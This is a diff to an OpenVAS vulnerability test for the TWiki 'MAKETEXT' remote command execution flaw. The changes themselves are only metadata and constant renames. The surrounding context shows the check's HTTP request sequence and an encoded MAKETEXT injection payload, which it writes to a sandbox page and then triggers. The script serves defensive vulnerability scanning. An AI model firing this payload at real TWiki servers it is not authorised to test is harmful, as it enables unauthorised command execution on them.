@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_twiki_maketext_rce_vuln.nasl 3566 2016-06-21 07:31:36Z benallard $
+# $Id: gb_twiki_maketext_rce_vuln.nasl 5963 2017-04-18 09:02:14Z teissa $
 #
 # TWiki 'MAKETEXT' variable Remote Command Execution Vulnerability
 #
@@ -29,16 +29,15 @@ CPE = "cpe:/a:twiki:twiki";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802048");
-  script_version("$Revision: 3566 $");
+  script_version("$Revision: 5963 $");
   script_bugtraq_id(56950);
   script_cve_id("CVE-2012-6329", "CVE-2012-6330");
   script_tag(name:"cvss_base", value:"7.5");
-  script_tag(name:"last_modification", value:"$Date: 2016-06-21 09:31:36 +0200 (Tue, 21 Jun 2016) $");
+  script_tag(name:"last_modification", value:"$Date: 2017-04-18 11:02:14 +0200 (Tue, 18 Apr 2017) $");
   script_tag(name:"creation_date", value:"2012-12-27 12:46:41 +0530 (Thu, 27 Dec 2012)");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
   script_name("TWiki 'MAKETEXT' variable Remote Command Execution Vulnerability");
   script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
-  script_summary("Check for RCE vulnerability in TWiki");
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
   script_dependencies("gb_twiki_detect.nasl");
@@ -87,7 +86,7 @@ sandbox_page = "/Sandbox/OVTestPage123";
 url1 = dir + "/edit" + sandbox_page + "?nowysiwyg=1";
 req1 = string("GET ", url1 , " HTTP/1.1\r\n",
              "Host: ", host, "\r\n",
-             "User-Agent: ", OPENVAS_USER_AGENT, "\r\n",
+             "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
              "Cookie: TWIKISID=\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Content-Length: 0\r\n\r\n");
@@ -122,7 +121,7 @@ post_data = string("crypttoken=", crypt_token , "&text=OpenVASTest%20%25",
             "%60%3B%20%7B%20%23%22%20args%3D%22QpR%22%7D%25");
 req2 = string("POST ", url2 , " HTTP/1.1\r\n",
              "Host: ", host, "\r\n",
-             "User-Agent: ", OPENVAS_USER_AGENT, "\r\n",
+             "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
              "Cookie: TWIKISID=", cookie, "\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Content-Length: ", (strlen(post_data)), "\r\n\r\n",
@@ -133,7 +132,7 @@ res2 = http_keepalive_send_recv(port:twikiPort, data:req2);
 url3 = dir + "/view" + sandbox_page;
 req3 = string("GET ", url3 , " HTTP/1.1\r\n",
              "Host: ", host, "\r\n",
-             "User-Agent: ", OPENVAS_USER_AGENT, "\r\n",
+             "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
              "Cookie: TWIKISID=\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Content-Length: 0\r\n\r\n");
@@ -144,7 +143,7 @@ url4 = dir + "/save" + sandbox_page;
 post_data = string("crypttoken=", crypt_token , "&text=OV-Test");
 req4 = string("POST ", url4 , " HTTP/1.1\r\n",
              "Host: ", host, "\r\n",
-             "User-Agent: ", OPENVAS_USER_AGENT, "\r\n",
+             "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
              "Cookie: TWIKISID=", cookie, "\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Content-Length: ", (strlen(post_data)), "\r\n\r\n",
